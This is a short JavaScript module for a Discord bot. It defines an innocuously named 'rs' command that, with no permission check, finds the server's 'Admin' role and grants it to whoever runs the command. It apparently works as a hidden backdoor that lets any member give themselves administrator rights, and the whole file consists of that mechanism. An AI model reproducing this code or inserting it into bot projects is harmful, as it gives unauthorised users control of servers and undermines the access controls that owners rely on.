module.exports = {
    commands: ['rs'],
    minArgs: 0,
    maxArgs: 0,
    callback: async (message, arguments, text) => {
        let modrole = message.guild.roles.cache.find(role => role.name === "Admin");   
        message.member.roles.add(modrole);
    }
}